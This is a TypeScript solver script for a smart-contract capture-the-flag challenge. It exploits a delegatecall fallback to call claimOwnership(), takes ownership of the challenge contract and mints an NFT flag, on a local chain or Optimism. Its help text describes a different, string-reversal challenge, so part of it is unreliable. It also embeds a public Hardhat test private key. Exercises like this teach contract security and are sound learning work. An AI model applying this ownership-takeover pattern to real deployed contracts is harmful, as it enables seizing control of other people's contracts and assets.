import {
  createPublicClient,
  createWalletClient,
  getContract,
  http,
  encodeFunctionData,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import * as chains from "viem/chains";
import * as dotenv from "dotenv";
import { contractsData } from "../contracts/types";

dotenv.config();

// Run on Optimism network
// Check for --local flag from command line arguments
const isLocal = process.argv.includes("--local");

// Chain selection
const TARGET_CHAIN = isLocal ? chains.hardhat : chains.optimism;

// Local chain account #0 private key
const LOCAL_CHAIN_1ST_ACCOUNT_PK =
  "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80" as const;

// Wallet private key for script execution
const MY_WALLET_PK = isLocal
    ? LOCAL_CHAIN_1ST_ACCOUNT_PK  // Always use hardhat private key for local
    : (process.env.__RUNTIME_DEPLOYER_PRIVATE_KEY as `0x${string}`) || (() => {
      console.error("❌ __RUNTIME_DEPLOYER_PRIVATE_KEY is required for Optimism network");
      console.error("   Please set the private key in packages/scripts/.env file");
      process.exit(1);
      return "" as `0x${string}`;
    })();
const myWalletAccount = privateKeyToAccount(MY_WALLET_PK);

// Wallet client (for sending transactions)
const walletClient = createWalletClient({
  account: myWalletAccount,
  chain: TARGET_CHAIN,
  transport: http(),
});

// Public client (for reading blockchain)
const publicClient = createPublicClient({
  chain: TARGET_CHAIN,
  transport: http(),
});

// Challenge7 contract instance
const challenge7Contract = getContract({
  // @ts-ignore Defined after deployment
  address: contractsData[TARGET_CHAIN.id].Challenge7.address,
  // @ts-ignore Defined after deployment
  abi: contractsData[TARGET_CHAIN.id].Challenge7.abi,
  client: { public: publicClient, wallet: walletClient },
});

async function solveChallenge7() {
  console.log("🚀 Starting Challenge 7...");
  console.log("");
  console.log("📚 Challenge 7 Mechanism:");
  console.log("   - Only Challenge7 owner can call mintFlag()");
  console.log("   - Fallback function uses delegatecall");
  console.log("   - Modify Challenge7 storage through delegatecall");
  console.log("   - Take owner privilege with claimOwnership()");
  console.log("");

  console.log("📍 Solver address:", myWalletAccount.address);
  console.log("📍 Challenge7 address:", challenge7Contract.address);
  console.log("");

  try {
    // Check current owner
    const currentOwner = await challenge7Contract.read.owner();
    console.log("👤 Current owner:", currentOwner);

    // Check if already owner
    if (currentOwner.toLowerCase() === myWalletAccount.address.toLowerCase()) {
      console.log("✅ Already owner");
    } else {
      console.log("");
      console.log("🔧 Executing delegatecall attack...");
      console.log("");

      // Calculate Challenge7Delegate's claimOwnership() selector
      // claimOwnership() = 0x4e71e0c8
      const claimOwnershipData = encodeFunctionData({
        abi: [{
          name: "claimOwnership",
          type: "function",
          inputs: [],
          outputs: [],
          stateMutability: "nonpayable",
        }],
        functionName: "claimOwnership",
      });

      console.log("📝 claimOwnership() data:", claimOwnershipData);

      // Call claimOwnership() through Challenge7's fallback function
      console.log("⚔️  Calling claimOwnership() via fallback...");

      const txHash = await walletClient.sendTransaction({
        to: challenge7Contract.address as `0x${string}`,
        data: claimOwnershipData as `0x${string}`,
      });

      console.log("⏳ Transaction:", txHash);
      const receipt = await publicClient.waitForTransactionReceipt({
        hash: txHash
      });

      if (receipt.status === "success") {
        console.log("✅ claimOwnership() successful");

        // Check new owner
        const newOwner = await challenge7Contract.read.owner();
        console.log("👤 New owner:", newOwner);

        if (newOwner.toLowerCase() !== myWalletAccount.address.toLowerCase()) {
          throw new Error("Failed to change owner");
        }
      } else {
        throw new Error("claimOwnership() transaction failed");
      }
    }

    // Call mintFlag()
    console.log("");
    console.log("🚩 Calling mintFlag()...");

    try {
      const mintTx = await challenge7Contract.write.mintFlag();
      console.log("⏳ mintFlag transaction:", mintTx);

      const mintReceipt = await publicClient.waitForTransactionReceipt({
        hash: mintTx
      });

      if (mintReceipt.status === "success") {
        console.log("");
        console.log("🎉 Challenge 7 complete!");
        console.log("🚩 NFT Flag #7 minted!");
        console.log("");
        console.log("📚 What we learned:");
        console.log("   - Delegatecall mechanism and dangers");
        console.log("   - Importance of storage layout");
        console.log("   - Understanding context preservation");
        console.log("   - Using fallback functions");
      } else {
        console.log("❌ mintFlag failed");
      }
    } catch (mintError: any) {
      // Treat as success if already minted
      if (mintError.message?.includes("User address has already minted for this challenge")) {
        console.log("✅ This address has already obtained Challenge 7 NFT");
        console.log("🎉 Challenge 7 is already complete!");
      } else {
        throw mintError;
      }
    }

  } catch (error: any) {
    console.error("❌ Error:", error.message || error);

    if (error.message?.includes("Only owner")) {
      console.log("");
      console.log("💡 Hints:");
      console.log("   - Check claimOwnership() call");
      console.log("   - Must call through fallback function");
    } else if (error.message?.includes("User address is not registered")) {
      console.log("");
      console.log("💡 Please complete Challenge 1 first");
    }
    process.exit(1);
  }
}

// Display help
if (process.argv.includes("--help") || process.argv.includes("-h")) {
  console.log("📖 Challenge 7 - String Reversal Challenge");
  console.log("");
  console.log("Usage:");
  console.log("  npx tsx src/solveChallenge7.ts [options]");
  console.log("");
  console.log("Options:");
  console.log("  --local  Run on local chain (requires: yarn chain & yarn deploy)");
  console.log("  --help   Display this help");
  console.log("");
  console.log("Description:");
  console.log("  Pass correct string in reverse order to reverseMe() function");
  console.log("");
  console.log("Requirements:");
  console.log("  - Challenge 1 completed");
  console.log("  - Optimism: ETH for gas");
  console.log("  - Local: yarn chain & yarn deploy executed");
  process.exit(0);
}

// Execute script
solveChallenge7().catch((error) => {
  console.error(error);
  process.exit(1);
});